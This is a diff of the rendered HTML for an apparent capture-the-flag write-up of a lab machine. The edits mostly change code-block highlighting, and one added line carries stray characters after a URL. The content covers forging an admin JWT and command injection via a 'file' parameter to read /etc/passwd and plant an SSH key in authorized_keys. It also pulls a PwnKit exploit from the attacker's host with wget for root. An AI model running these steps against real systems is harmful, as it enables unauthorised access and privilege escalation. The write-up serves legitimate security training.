+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;  Date:   Fri Sep 3 11:30:17 2021 +0530
 
       removed .env for security reasons
 
@@ -262,14 +426,14 @@ http://10.10.11.120/api/user/register
   +TOKEN_SECRET = secret
 
   commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
-  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
-  Date:   Fri Sep 3 11:25:52 2021 +0530
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;  Date:   Fri Sep 3 11:25:52 2021 +0530
 
       first commit
 
   diff --git a/.env b/.env
   new file mode 100644
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
@@ -286,14 +450,14 @@ http://10.10.11.120/api/user/register
     &lt;/ul&gt;
   &lt;/li&gt;
   &lt;li&gt;Testing the new token
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl http://10.10.11.120:3000/api/priv   -H &quot;auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  curl http://10.10.11.120:3000/api/priv   -H &quot;auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU&quot;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;&lt;strong&gt;SUCCESS!&lt;/strong&gt;
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
- └─$ curl http://10.10.11.120:3000/api/priv   -H &quot;auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU&quot;
- {&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}}     
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt; ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; └─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl http://10.10.11.120:3000/api/priv   &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU&quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt; {&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}}     
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
@@ -301,9 +465,9 @@ http://10.10.11.120/api/user/register
 
 &lt;ul&gt;
   &lt;li&gt;You can query http://10.10.11.120/api/logs as admin and execute commands through index.js which includes an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec()&lt;/code&gt; call.&lt;/li&gt;
-  &lt;li&gt;Requests must be URL encoded (I used https://gchq.github.io/CyberChef/ for this)&lt;/li&gt;
+  &lt;li&gt;Requests must be URL encoded (I used &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; for this)&lt;/li&gt;
   &lt;li&gt;You can run the following request to read /etc/passwd
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  http://10.10.11.120/api/logs?file=index.js;cat%20/etc/passwd
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  http://10.10.11.120/api/logs?file=index.js;cat%20/etc/passwdpo;iok
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Reading /etc/passwd gives you the name of the non-standard user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dasith&lt;/code&gt;&lt;/li&gt;
@@ -312,8 +476,8 @@ http://10.10.11.120/api/user/register
 &lt;h2 id=&quot;9-gaining-ssh&quot;&gt;9. Gaining SSH&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;Generate a new ssh key for this challenge and label it secret.htb
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
     &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  - -C is the comment
   - -t is the type
   - -b is the bytes
@@ -325,33 +489,33 @@ http://10.10.11.120/api/user/register
   &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export PUBLIC_KEY=$(cat secret.htb.pub)&lt;/code&gt;
       - You &lt;strong&gt;must&lt;/strong&gt; do this step&lt;/li&gt;
   &lt;li&gt;Craft a GET request that adds your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$PUBLIC_KEY&lt;/code&gt; contents to /home/dasith/.ssh/authorized_keys on the target machine
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
-  └─$ curl \
-  &amp;gt; -i \
-  &amp;gt; -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU' \
-  &amp;gt; -G \
-  &amp;gt; --data-urlencode &quot;file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY &amp;gt;&amp;gt; /home/dasith/.ssh/authorized_keys&quot; \
-  &amp;gt; 'http://10.10.11.120/api/logs'
-  HTTP/1.1 200 OK
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  └─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file=index.js; mkdir -p /home/dasith/.ssh; echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PUBLIC_KEY&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt;&amp;gt; /home/dasith/.ssh/authorized_keys&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://10.10.11.120/api/logs'&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;  HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Date: Tue, 15 Mar 2022 18:28:33 GMT
-  Content-Type: application/json; charset=utf-8
-  Content-Length: 27
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  Content-Type: application/json;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+&lt;span class=&quot;go&quot;&gt;  Content-Length: 27
   Connection: keep-alive
   X-Powered-By: Express
   ETag: W/&quot;1b-pFfOEX46IRaNi6v8ztcwIwl9EF8&quot;
 
   &quot;ab3e953 Added the codes\n&quot; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Login with SSH
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ssh -i secret.htb dasith@10.10.11.120
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  ssh -i secret.htb dasith@10.10.11.120
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;10-user-flag&quot;&gt;10. User Flag&lt;/h2&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```shell_session
 cat user.txt
 d##############################d
 ```
@@ -372,15 +536,15 @@ d##############################d
     &lt;/ul&gt;
   &lt;/li&gt;
   &lt;li&gt;Investigate /opt/
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  dasith@secret:/tmp$ ls -la /opt
-  total 56
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;  dasith@secret:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /opt
+&lt;span class=&quot;go&quot;&gt;  total 56
   drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
   drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
   -rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
   -rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
   -rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
   -rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
     &lt;ul&gt;
       &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;valgrind.log&lt;/code&gt; contains memory dump information
         &lt;ul&gt;
@@ -420,8 +584,8 @@ d##############################d
 &lt;h2 id=&quot;12-root-flag&quot;&gt;12. Root Flag&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;Navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt;
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  cat root.txt
-  a##############################8
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  cat root.txt
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  a#&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#############################8&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;VICTORY!&lt;/li&gt;
@@ -435,10 +599,10 @@ d##############################d
   &lt;li&gt;In the directory that your PwnKit script is in, start an HTTP server with Python
   &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server 80&lt;/code&gt;&lt;/li&gt;
   &lt;li&gt;On victim machine, pull the script down, chmod it to be executable, and run it
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  wget &amp;lt;your ip&amp;gt;/PwnKit
-  chmod +x PwnKit
+    &lt;div class=&quot;language-shell_session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;  wget &amp;lt;your ip&amp;gt;&lt;/span&gt;/PwnKit
+&lt;span class=&quot;go&quot;&gt;  chmod +x PwnKit
   ./PwnKit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;TADA! You are root!&lt;/li&gt;
   &lt;li&gt;Proceed to cat /root/root.txt for the root flag.&lt;/li&gt;
